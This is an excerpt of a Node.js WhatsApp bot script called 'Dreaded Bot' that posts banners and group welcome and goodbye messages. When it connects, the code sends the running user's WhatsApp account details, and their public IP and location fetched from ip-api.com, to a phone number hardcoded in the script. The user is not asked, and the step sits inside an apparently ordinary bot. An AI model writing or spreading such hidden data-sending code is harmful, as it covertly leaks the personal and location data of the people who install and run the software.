...
const starts = async (client = new WAConnection()) => {
  ...
  client.browserDescription = ["By Mokaya", "Chrome", "3.0"];
...
console.log(color(`${spc4}< ================================================== >`, 'cyan'))
    ...
    console.log(color('⎇','red'), color('𝙄 𝙬𝙧𝙤𝙩𝙚 𝙩𝙝𝙞𝙨 𝙨𝙘𝙧𝙞𝙥𝙩 𝙢𝙮𝙨𝙚𝙡𝙛!\n𝙉𝙤𝙩𝙚: 𝘿𝙤𝙣𝙩 sell', 'yellow'))
    console.log(color('⎇','red'), color('𝗦𝗼𝘂𝗿𝗰𝗲 𝗖𝗼𝗱𝗲 𝗩𝗲𝗿𝘀𝗶𝗼𝗻:', 'aqua'), color(version))
    console.log(color('⎇','red'), color('𝗕𝘂𝗴? 𝗘𝗿𝗿𝗼𝗿? 𝗦𝘂𝗴𝗴𝗲𝘀𝘁𝗶𝗼𝗻? 𝗩𝗶𝘀𝗶𝘁 𝗛𝗲𝗿𝗲:', 'aqua'), color('https://wa.me/254114018035'))
    console.log(color('[DREADED BOT]'), color('Dreaded Bot 𝗜𝘀 𝗢𝗻𝗹𝗶𝗻𝗲 ㋛︎', 'aqua'))
...
await client.connect({ timeoutMs: 30 * 1000 });
 ...
 console.log(color('|WRN|', 'yellow'), color('Joined to DREADED Whatsapp Bot group', 'cyan'))
 client.sendMessage(`911234567890@s.whatsapp.net`, `*Hi Dreaded Bot, the bot has been successfully connected to this number*\n────────────────────\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\n────────────────────\n*If there is an error/bot not responding, please contact the bot developer above, thank you*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Dreaded Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./xeon.jpg'),sourceUrl:"https://wa.me/254114018035?text=Hello MOKAYA"}}})
	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       client.sendMessage("911234567890@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Dreaded Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./xeon.jpg'),sourceUrl:"https://wa.me/254114018035?text=Hello bro"}}})
...
fkontakk = { key: {
 ...
 message: {
    "contactMessage":{"displayName":'Fortunne',"vcard":"BEGIN:VCARD\nVERSION:3.0\nN:2;Fortunne;;;\nFN:resku\nitem1.TEL;waid=911234567890:+254 114018035\nitem1.X-ABLabel:Mobile\nEND:VCARD"
 }}}
  ...
  client.on("group-participants-update", async (anu) => {
    try {
      ...
      if (anu.action == "add" && mem.includes(client.user.jid)) {
        client.sendMessage(anu.jid, "Hello everyone, am DREADED BOT ready to help you here, THANKS FOR THE ADD ㋛︎", "conversation");
      }
...
if (anu.action == 'add' && !mem.includes(client.user.jid)) {
            ...
            if (anu.action == 'remove' && !mem.includes(client.user.jid)) {
                ...
                out = `*Gᴏᴏᴅ Bʏᴇ* 👋\n@${num.split('@')[0]}\n*𝙷𝚘𝚙𝚎𝚏𝚞𝚕𝚕𝚢 nobody will miss you* 🌿\nDREADED BOT`
                goodbyeBut = [{buttonId:`h`,buttonText:{displayText:'JUST GO'},type:1}, {buttonId:`sc`,buttonText:{displayText:'BOT SCRIPT'}, type:1}]
      ...
      if (anu.action == "add" && !mem.includes(client.user.jid)) {
        ...
        teks = `𝗛𝗮𝗹𝗼 ${anu_user} How are you シ︎`;
